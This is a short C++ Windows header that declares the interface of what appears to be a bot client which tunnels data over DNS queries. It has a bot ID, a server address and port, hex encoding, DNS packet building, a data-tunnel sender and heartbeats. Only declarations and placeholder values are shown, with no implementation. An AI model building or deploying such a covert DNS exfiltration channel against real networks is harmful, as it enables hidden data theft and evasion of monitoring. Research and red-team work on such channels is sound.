#pragma once
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <windns.h>
#include <string>
#include <iomanip>

using namespace std;

extern      const   char* SERVER_IP;
extern      const   int SERVER_PORT;
extern      const   char* BOT_ID;
extern      SOCKET  clientSocket;
constexpr   DWORD   dns_options     = DNS_QUERY_BYPASS_CACHE + DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE;
inline      string  TARGET          = "example.com";
inline      const char* CUSTOM_DNS_SERVER_IP = "127.0.0.1";
int startConnection(const char* domain);
int sendData(int& id, int& packetNumber, const char* domain, const char* data);
string convertToHex(const char* string);
string CreateDNSPacket(const string& jsonData);
bool InitializeConnection();
bool SendDataTunnel(const string& data);
void SendManualInput(const string& content);
void SendHeartbeat();

